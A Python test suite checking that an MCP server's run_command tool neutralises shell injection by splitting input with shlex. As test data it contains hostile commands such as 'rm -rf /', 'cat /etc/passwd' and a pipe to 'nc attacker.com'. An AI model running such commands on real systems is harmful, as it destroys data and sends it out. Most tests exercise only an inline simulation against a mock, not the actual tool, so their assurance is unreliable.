"""Security tests for MCP server run_command tool."""

import asyncio
import shlex
from unittest.mock import AsyncMock, MagicMock, patch

import pytest


class TestMCPServerSecurity:
    """Test security aspects of MCP server run_command tool."""

    @pytest.mark.asyncio
    async def test_run_command_prevents_shell_injection(self):
        """Test that run_command prevents shell injection attacks."""
        # Mock the subprocess execution to capture what would be executed
        with patch("asyncio.create_subprocess_exec") as mock_exec:
            mock_process = AsyncMock()
            mock_process.communicate.return_value = (b"hello; rm -rf /", b"")
            mock_process.returncode = 0
            mock_exec.return_value = mock_process

            # Test case 1: Command chaining attempt
            malicious_cmd = "echo hello; rm -rf /"

            # Simulate the secure implementation
            command_parts = shlex.split(malicious_cmd)
            proc = await asyncio.create_subprocess_exec(
                *command_parts,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )

            # Verify that create_subprocess_exec was called with split arguments
            mock_exec.assert_called_once()
            args, kwargs = mock_exec.call_args

            # The command should be split into separate arguments
            # This prevents shell interpretation of the semicolon
            # shlex.split("echo hello; rm -rf /") -> ["echo", "hello;", "rm", "-rf", "/"]
            assert args == ("echo", "hello;", "rm", "-rf", "/")
            assert kwargs["stdout"] == asyncio.subprocess.PIPE
            assert kwargs["stderr"] == asyncio.subprocess.PIPE

    @pytest.mark.asyncio
    async def test_run_command_handles_various_injection_attempts(self):
        """Test various command injection attack vectors."""
        injection_attempts = [
            "echo test && rm file.txt",  # Command chaining
            "echo test; cat /etc/passwd",  # Command separation
            "echo test | nc attacker.com",  # Piping
            "echo test > /etc/hosts",  # File redirection
            "echo test `whoami`",  # Command substitution
            "echo test $(id)",  # Command substitution
            "echo test & background_cmd",  # Background execution
        ]

        for malicious_cmd in injection_attempts:
            with patch("asyncio.create_subprocess_exec") as mock_exec:
                mock_process = AsyncMock()
                mock_process.communicate.return_value = (malicious_cmd.encode(), b"")
                mock_process.returncode = 0
                mock_exec.return_value = mock_process

                # Simulate the secure implementation
                command_parts = shlex.split(malicious_cmd)
                proc = await asyncio.create_subprocess_exec(
                    *command_parts,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )

                # Verify that the command was split safely
                mock_exec.assert_called_once()
                args, kwargs = mock_exec.call_args

                # The first argument should be "echo"
                assert args[0] == "echo"
                # The shell metacharacters should be in subsequent arguments as literal text
                assert len(args) >= 2

    @pytest.mark.asyncio
    async def test_run_command_handles_quoted_arguments(self):
        """Test that quoted arguments are handled correctly."""
        with patch("asyncio.create_subprocess_exec") as mock_exec:
            mock_process = AsyncMock()
            mock_process.communicate.return_value = (b"test output", b"")
            mock_process.returncode = 0
            mock_exec.return_value = mock_process

            # Test command with quoted arguments
            cmd = 'echo "hello world" test'

            # Simulate the secure implementation
            command_parts = shlex.split(cmd)
            proc = await asyncio.create_subprocess_exec(
                *command_parts,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )

            # Verify that quoted arguments are parsed correctly
            mock_exec.assert_called_once()
            args, kwargs = mock_exec.call_args

            # Should be: ("echo", "hello world", "test")
            assert args == ("echo", "hello world", "test")

    @pytest.mark.asyncio
    async def test_run_command_handles_malformed_quotes(self):
        """Test that malformed quotes are handled gracefully."""
        with patch("asyncio.create_subprocess_exec") as mock_exec:
            # Test command with unmatched quotes
            cmd = 'echo "hello world'  # Missing closing quote

            # Test that shlex.split raises ValueError for malformed quotes
            with pytest.raises(ValueError):
                command_parts = shlex.split(cmd)

            # In the actual implementation, this would be caught and handled
            try:
                command_parts = shlex.split(cmd)
                # This should not be reached
                assert False, "Expected ValueError for malformed quotes"
            except ValueError:
                # This is the expected behavior - malformed quotes should raise ValueError
                pass

            # create_subprocess_exec should not be called due to shlex error
            mock_exec.assert_not_called()

    @pytest.mark.asyncio
    async def test_run_command_timeout_protection(self):
        """Test that timeout protection works correctly."""
        with patch("asyncio.create_subprocess_exec") as mock_exec:
            mock_process = AsyncMock()
            # Simulate a timeout
            mock_process.communicate.side_effect = asyncio.TimeoutError()
            mock_exec.return_value = mock_process

            # Simulate the secure implementation with timeout
            command_parts = shlex.split("sleep 100")

            try:
                proc = await asyncio.create_subprocess_exec(
                    *command_parts,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=1)
                assert False, "Expected TimeoutError"
            except asyncio.TimeoutError:
                # This is expected behavior
                pass

            # Verify subprocess was called
            mock_exec.assert_called_once()

    @pytest.mark.asyncio
    async def test_run_command_uses_safe_subprocess_call(self):
        """Test that run_command uses safe subprocess execution."""
        with patch("asyncio.create_subprocess_exec") as mock_exec:
            mock_process = AsyncMock()
            mock_process.communicate.return_value = (b"test output", b"")
            mock_process.returncode = 0
            mock_exec.return_value = mock_process

            # Simulate the secure implementation
            command_parts = shlex.split("echo test")
            proc = await asyncio.create_subprocess_exec(
                *command_parts,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )

            # Verify that create_subprocess_exec was used (not create_subprocess_shell)
            mock_exec.assert_called_once()
            args, kwargs = mock_exec.call_args

            # Arguments should be passed as separate parameters
            assert args == ("echo", "test")
            assert kwargs["stdout"] == asyncio.subprocess.PIPE
            assert kwargs["stderr"] == asyncio.subprocess.PIPE

    @pytest.mark.asyncio
    async def test_run_command_error_handling(self):
        """Test proper error handling for failed commands."""
        with patch("asyncio.create_subprocess_exec") as mock_exec:
            mock_process = AsyncMock()
            mock_process.communicate.return_value = (b"", b"command not found")
            mock_process.returncode = 127  # Command not found
            mock_exec.return_value = mock_process

            # Simulate the secure implementation
            command_parts = shlex.split("nonexistent_command")
            proc = await asyncio.create_subprocess_exec(
                *command_parts,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await proc.communicate()

            # Verify subprocess was called and returned error
            mock_exec.assert_called_once()
            assert proc.returncode == 127
            assert stderr == b"command not found"

    def test_shlex_split_security(self):
        """Test that shlex.split properly handles injection attempts."""
        # Test various injection attempts
        injection_attempts = [
            ("echo test && rm file.txt", ["echo", "test", "&&", "rm", "file.txt"]),
            ("echo test; cat /etc/passwd", ["echo", "test;", "cat", "/etc/passwd"]),
            (
                "echo test | nc attacker.com",
                ["echo", "test", "|", "nc", "attacker.com"],
            ),
            ("echo test > /etc/hosts", ["echo", "test", ">", "/etc/hosts"]),
            ("echo test `whoami`", ["echo", "test", "`whoami`"]),
            ("echo test $(id)", ["echo", "test", "$(id)"]),
            ("echo test & background_cmd", ["echo", "test", "&", "background_cmd"]),
        ]

        for malicious_cmd, expected_parts in injection_attempts:
            # shlex.split should treat shell metacharacters as literal text
            actual_parts = shlex.split(malicious_cmd)
            assert actual_parts == expected_parts

            # The key security win: shell metacharacters are in separate arguments
            # and will be treated as literal text by the subprocess, not as shell commands
